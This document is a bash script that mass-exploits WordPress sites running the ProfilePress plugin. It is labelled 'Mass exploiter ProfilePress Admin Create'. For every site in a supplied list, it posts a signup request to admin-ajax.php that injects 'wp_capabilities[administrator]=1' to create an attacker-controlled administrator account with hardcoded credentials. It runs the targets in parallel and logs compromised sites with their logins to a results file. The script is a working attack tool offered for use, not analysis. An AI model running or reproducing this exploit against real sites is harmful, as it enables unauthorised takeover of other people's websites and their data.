#!/bin/bash
#kyu_kazami

cat << "EOF"
▒█▀▀█ █▀▀█ █▀▀█ █▀▀ ░▀░ █░░ █▀▀ ▒█▀▀█ █▀▀█ █▀▀ █▀▀ █▀▀ 
▒█▄▄█ █▄▄▀ █░░█ █▀▀ ▀█▀ █░░ █▀▀ ▒█▄▄█ █▄▄▀ █▀▀ ▀▀█ ▀▀█ 
▒█░░░ ▀░▀▀ ▀▀▀▀ ▀░░ ▀▀▀ ▀▀▀ ▀▀▀ ▒█░░░ ▀░▀▀ ▀▀▀ ▀▀▀ ▀▀▀

EOF

printf "   Mass exploiter ProfilePress Admin Create   \n"
printf "   Usage : bash $0 <list> <thread>   \n" 

silitkuda(){
classic='\033[0m'
red='\e[41m'
green='\e[42m'
site=$1
thread=$2 

if [[ $(curl -s --max-time 10 --connect-time 10 -X POST $site'/wp-admin/admin-ajax.php' -d 'reg_username=kyukazami&reg_email=resultssmtp@yahoo.com&reg_password=Mabar123###&reg_password_present=true&reg_first_name=zen&reg_last_name=fos&wp_capabilities[administrator]=1&action=pp_ajax_signup') =~ 'wordpress.org/support/article/faq-troubleshooting' ]]; then
	printf "${green}[Vulnerable]${classic} => $site\n"
	printf "$site/wp-login.php\n Username:kyukazami\n Password:Mabar123###\n\n" >> rzlt.txt
	else
    printf "${red}[Not Vuln]${classic} => $site\n"
fi
}

export -f silitkuda
parallel -j $2 silitkuda :::: $1 